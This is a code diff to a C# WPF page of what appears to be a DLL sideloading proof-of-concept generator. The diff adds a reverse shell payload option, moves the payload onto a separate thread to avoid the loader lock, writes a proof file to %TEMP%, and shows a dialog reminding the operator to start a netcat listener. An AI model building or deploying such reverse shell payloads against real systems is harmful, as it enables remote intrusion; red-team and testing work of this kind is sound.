@@ -438,6 +438,8 @@ public partial class GeneratePage : Page
     private void PayloadCombo_Changed(object sender, SelectionChangedEventArgs e)
     {
         if (PayloadDataBox == null) return;
+        // Index 4 = ReverseShell: host/port come from Config (Payload Defaults),
+        // not from the per-PoC data box. Keep PayloadDataBox hidden for it.
         PayloadDataBox.Visibility = PayloadCombo.SelectedIndex switch
         {
             1 or 2 or 3 => Visibility.Visible,
@@ -452,6 +454,43 @@ public partial class GeneratePage : Page
         if (SandboxTargetsPanel != null)
             SandboxTargetsPanel.Visibility = PayloadCombo.SelectedIndex == 3
                 ? Visibility.Visible : Visibility.Collapsed;
+
+        // ReverseShell does Winsock + CreateProcess, which is unsafe under the
+        // loader lock — so when the user picks it, switch Thread mode to "New
+        // thread (CreateThread)" (so do_payload runs outside DllMain) and turn
+        // Write proof file on (so failures leave a %TEMP%\dllsidecar_proof_*.txt
+        // breadcrumb). One-shot defaults, not locked — user can override.
+        // _suppressPersist also gates the user-facing dialog: we don't want
+        // a popup when RestoreUiState() flips the combo at page load.
+        if (PayloadCombo.SelectedIndex == 4)
+        {
+            if (ThreadCombo != null) ThreadCombo.SelectedIndex = 1;   // 0=Calling, 1=Std (CreateThread), 2=Native
+            if (ChkWriteProof != null) ChkWriteProof.IsChecked = true;
+            if (!_suppressPersist) ShowReverseShellAdvisory();
+        }
+    }
+
+    /// <summary>
+    /// One-shot informational modal explaining the auto-applied defaults when
+    /// the user picks ReverseShell. Kept on this page (not a global helper)
+    /// because the body references the exact controls visible here.
+    /// </summary>
+    private static void ShowReverseShellAdvisory()
+    {
+        MessageBox.Show(
+            "Reverse shell selected — safe defaults applied:\n\n" +
+            "  • Thread mode → New thread (CreateThread)\n" +
+            "      Required: Winsock + CreateProcessA under the DllMain loader\n" +
+            "      lock deadlocks the host. A separate thread runs do_payload()\n" +
+            "      after DllMain returns.\n\n" +
+            "  • Write proof file → ON\n" +
+            "      Leaves %TEMP%\\dllsidecar_proof_<PID>.txt at payload entry so\n" +
+            "      you can confirm execution even if the listener never sees a\n" +
+            "      connection (firewall, missing nc -lvnp, AV block).\n\n" +
+            "Host / port come from Configuration → Payload Defaults.\n" +
+            "Don't forget the listener: nc -lvnp <port>  (or ncat).",
+            "Reverse shell — defaults applied",
+            MessageBoxButton.OK, MessageBoxImage.Information);
     }
 
     private async void Generate_Click(object sender, RoutedEventArgs e)
@@ -534,6 +573,12 @@ public partial class GeneratePage : Page
         var payloadCfg = ConfigManager.Current.Payload;
         config.MessageBoxTitle = payloadCfg.MessageBoxTitle;
         config.MessageBoxBody = payloadCfg.MessageBoxBody;
+
+        // ReverseShell endpoint also comes from the global defaults — host/port
+        // typically stay stable across a session (one listener, many PoCs),
+        // so a per-PoC override on this page would just add noise.
+        config.ReverseShellHost = payloadCfg.ReverseShellHost;
+        config.ReverseShellPort = payloadCfg.ReverseShellPort;
 
         // Runtime / deploy options — drive the .bat tail's probe/delay/wait logic
         // and the payload's proof file write. All three have safe defaults in XAML.
